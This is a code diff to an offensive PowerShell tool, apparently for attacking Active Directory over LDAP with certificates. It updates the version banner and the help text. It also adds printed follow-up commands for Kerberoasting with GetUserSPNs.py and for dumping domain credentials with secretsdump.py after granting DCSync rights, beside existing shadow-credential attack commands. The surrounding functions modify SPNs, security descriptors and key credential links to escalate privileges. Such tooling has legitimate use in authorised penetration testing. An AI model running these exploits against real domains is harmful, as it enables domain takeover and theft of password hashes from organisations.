@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.5.7 "
+    Write-Host -ForegroundColor Red     "   v1.5.8 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -781,7 +781,7 @@ function _Helper-GetIndexOfUnicodeWideCharNull {
     for ($i = $StartIndex; $i -lt $Blob.Length; $i += 2) {
         if ([BitConverter]::ToChar($Blob, $i) -eq [char]::MinValue) {
             # Null-terminated WCHAR string found
-            Write-Verbose "[*] Successfully Retrieved Index $i Of The WCHAR NULL Character In The Provided From Start Index $StartIndex, In Blob '$Blob' !"
+            Write-Verbose "[+] Successfully Retrieved Index $i Of The WCHAR NULL Character In The Provided From Start Index $StartIndex, In Blob '$Blob' !"
             return $i
         }
     }
@@ -11276,11 +11276,15 @@ function _LDAPExploit {
 
             Adds the provided `-SPN` (or, if not specified, random) to the specified account's `serviceprincipalname` attribute.
 
+            - This requires WRITE privileges against the target's `servicePrincipalName` attribute.
+
         .EXAMPLE
 
             _LDAPExploit -LdapConnection $LdapConnection -Exploit 'DCSync' -IdentityDN 'CN=Wanha BE. ERUT,CN=Users,DC=X' -TargetDN 'DC=X'
 
             Grants the principal `Wanha BE. ERUT` with DCSync privileges over the domain `X` (or, if not specified, the LDAP/S Server's domain)
+
+            - This requires WRITE privileges against the target's `nTSecurityDescriptor` attribute.
 
         .EXAMPLE
 
@@ -11360,7 +11364,7 @@ function _LDAPExploit {
             _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'serviceprincipalname' -Value $SPN
 
             Write-Host "[*$Exploit*] [+] Successfully Added SPN '$SPN' Into The '$TargetDN':'serviceprincipalname' Attribute !!"
-
+            Write-Host "[*$Exploit*] [Exploit] GetUserSPNs.py  <domain>/'<user>':'<password>' -dc-ip <dc_ip> -request-user '$((_Filter -LdapConnection $LdapConnection -SearchBase $TargetDN -SearchScope 'Base' -Properties 'sAMAccountName').sAMAccountName)' -target-domain $(_Helper-GetDomainNameFromDN -DN $TargetDN) -outputfile kerberoast_tgs.hashes"
         }
 
         'DCSync' {
@@ -11378,6 +11382,7 @@ function _LDAPExploit {
 
             Write-Host "[*$Exploit*] [+] Successfully Granted '$IdentityDN' DCSync Rights Over Domain '$(_Helper-GetDomainNameFromDN -DN $TargetDN)' !!";
             Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'DCSync'"
+            Write-Host "[*$Exploit*] [Exploit] secretsdump.py $(_Helper-GetDomainNameFromDN -DN $IdentityDN)/'<user>':'<password>'@<dc_ip> -ts -user-status -history -pwd-last-set -just-dc -dc-ip <dc_ip>"
 
         }
         
@@ -11488,7 +11493,7 @@ function _LDAPExploit {
                 _AddValueInAttribute -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary
 
                 Write-Host "[*$Exploit*] [+] Successfully Populated '$TargetDN':'msDS-KeyCredentialLink' Attribute With A New Self-Signed Certificate !!"
-                Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ShadowCreds'"
+                Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ShadowCreds' -Object '$TargetDN'"
                 Write-Host "[*$Exploit*] [Exploit] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $TargetDN)/'$sAMAccountName' './out.ccache'"
                 Write-Host "[*$Exploit*] [Exploit] Rubeus.exe asktgt /dc:<dc_ip> /domain:$(_Helper-GetDomainNameFromDN -DN $TargetDN) /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /nowrap"
 
@@ -12492,8 +12497,6 @@ function Invoke-PassTheCert {
             Default { Write-Host "[!] Action '$Action' Not Recognized !" }
         }
     } catch { Write-Host "[!] Action '$Action' Failed With Error: $_" }
-    # Commented in the case the user provides it's own '$LdapConnection'; it shouldn't be disposed between executions.
-    #finally { if ($LdapConnection) {$LdapConnection.Dispose()} } 
     
     Write-Host ""
     
